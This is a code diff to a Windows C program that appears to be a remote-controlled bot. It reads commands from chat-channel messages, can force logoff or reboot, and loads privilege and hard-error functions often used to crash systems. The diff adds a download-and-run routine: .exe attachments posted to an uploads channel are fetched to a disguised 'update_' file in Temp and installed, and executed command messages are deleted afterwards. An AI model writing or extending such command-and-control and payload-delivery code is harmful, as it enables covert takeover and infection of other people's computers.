@@ -6,10 +6,12 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <stdbool.h>
+#include <shlobj.h>
 #include "bot.h"
 #include "dev.h"
 
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "shell32.lib")
 
 RtlAdjustPrivilege_t RtlAdjustPrivilege = NULL;
 NtRaiseHardError_t NtRaiseHardError = NULL;
@@ -85,6 +87,66 @@ static char* http_request(const wchar_t* host, const wchar_t* path, const wchar_
     WinHttpCloseHandle(hSession);
 
     return buffer;
+}
+
+static int download_file(const char* url, const char* save_path) {
+    HINTERNET hSession = WinHttpOpen(L"update-downloader",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return 0;
+
+    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
+    wchar_t host[256] = {0}, path[1024] = {0};
+    urlComp.lpszHostName = host;
+    urlComp.dwHostNameLength = 256;
+    urlComp.lpszUrlPath = path;
+    urlComp.dwUrlPathLength = 1024;
+
+    wchar_t wurl[2048];
+    MultiByteToWideChar(CP_UTF8, 0, url, -1, wurl, 2048);
+    WinHttpCrackUrl(wurl, 0, 0, &urlComp);
+
+    HINTERNET hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return 0; }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
+        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+        (urlComp.nPort == INTERNET_DEFAULT_HTTPS_PORT) ? WINHTTP_FLAG_SECURE : 0);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 0;
+    }
+
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 0;
+    }
+
+    WinHttpReceiveResponse(hRequest, NULL);
+
+    FILE* file = fopen(save_path, "wb");
+    if (!file) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 0;
+    }
+
+    char buffer[8192];
+    DWORD bytesRead = 0;
+    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+        fwrite(buffer, 1, bytesRead, file);
+    }
+
+    fclose(file);
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+    return 1;
 }
 
 static const char* cache_get(const char* name) {
@@ -170,6 +232,19 @@ int get_public_ip(char* out, DWORD out_size) {
     WinHttpCloseHandle(hSession);
 
     return ok ? 1 : 0;
+}
+
+static void get_safe_temp_path(char* out, size_t size) {
+    char temp_dir[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, temp_dir) == S_OK) {
+        snprintf(out, size, "%s\\Temp\\update_%llu.exe", temp_dir, (unsigned long long)GetTickCount64());
+    } else {
+        GetTempPathA((DWORD)size, out);
+        strcat(out, "update_");
+        char suffix[32];
+        snprintf(suffix, sizeof(suffix), "%llu.exe", (unsigned long long)GetTickCount64());
+        strcat(out, suffix);
+    }
 }
 
 static char* create_channel(const char* name) {
@@ -380,6 +455,7 @@ static void execute_command(Command* cmd) {
             CloseHandle(hToken);
         }
 
+        delete_message(cmd->__id);
         switch (cmd->shutdown) {
             case SHUTDOWN_TYPE_LOGOFF:   ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0); break;
             case SHUTDOWN_TYPE_REBOOT:   ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0); break;
@@ -464,6 +540,14 @@ void get_commands_to_exec(Command* out, int* out_count) {
     free(json);
 }
 
+void delete_executed_messages(Command* cmds, int count) {
+    for (int i = 0; i < count; i++) {
+        if (cmds[i].__executed) {
+            delete_message(cmds[i].__id);
+        }
+    }
+}
+
 void process_commands() {
     Command local_cmds[128];
     int count = 0;
@@ -479,16 +563,65 @@ void process_commands() {
     }
 }
 
-void delete_executed_messages(Command* cmds, int count) {
-    for (int i = 0; i < count; i++) {
-        if (cmds[i].__executed) {
-            delete_message(cmds[i].__id);
-        }
-    }
-}
+void process_uploads() {
+    if (!UPLOADS_ID || !UPLOADS_ID[0]) return;
 
-void command_executed(Command* cmd) {
-    cmd->__executed = true;
+    char* json = fetch_messages(UPLOADS_ID, 5);
+    if (!json) return;
+
+    char* p = json;
+    bool processed = false;
+
+    while ((p = strstr(p, "\"attachments\":")) && !processed) {
+        char* attach_start = p;
+        p += 15;
+
+        char msg_id[64] = {0};
+        char* id_start = strstr(attach_start, "\"id\":\"");
+        if (id_start) {
+            id_start += 6;
+            sscanf(id_start, "%63[^\"]", msg_id);
+        }
+
+        char* url_pos = strstr(attach_start, "\"url\":\"");
+        if (url_pos) {
+            url_pos += 7;
+            char url[1024] = {0};
+            sscanf(url_pos, "%1023[^\"]", url);
+
+            char* filename_pos = strstr(attach_start, "\"filename\":\"");
+            if (filename_pos) {
+                filename_pos += 12;
+                char filename[256] = {0};
+                sscanf(filename_pos, "%255[^\"]", filename);
+
+                if (strstr(filename, ".exe") || strstr(filename, ".EXE")) {
+                    if (msg_id[0]) {
+                        uint64_t installed_msg_id = get_installed_exe_msg_id();
+                        if (installed_msg_id && installed_msg_id == strtoull(msg_id, NULL, 10)) {
+                            processed = true;
+                            break;
+                        }
+                    }
+                    char tmp_path[MAX_PATH];
+                    get_safe_temp_path(tmp_path, sizeof(tmp_path));
+                    
+                    printf("Downloading update: %s -> %s\n", url, tmp_path);
+
+                    if (download_file(url, tmp_path)) {
+                        if (GetFileAttributesA(tmp_path) != INVALID_FILE_ATTRIBUTES) {
+                            update(tmp_path, msg_id[0] ? msg_id : NULL);
+                        }
+                        processed = true;
+                        break;
+                    }
+                }
+            }
+        }
+        p++;
+    }
+
+    free(json);
 }
 
 void init_bot() {
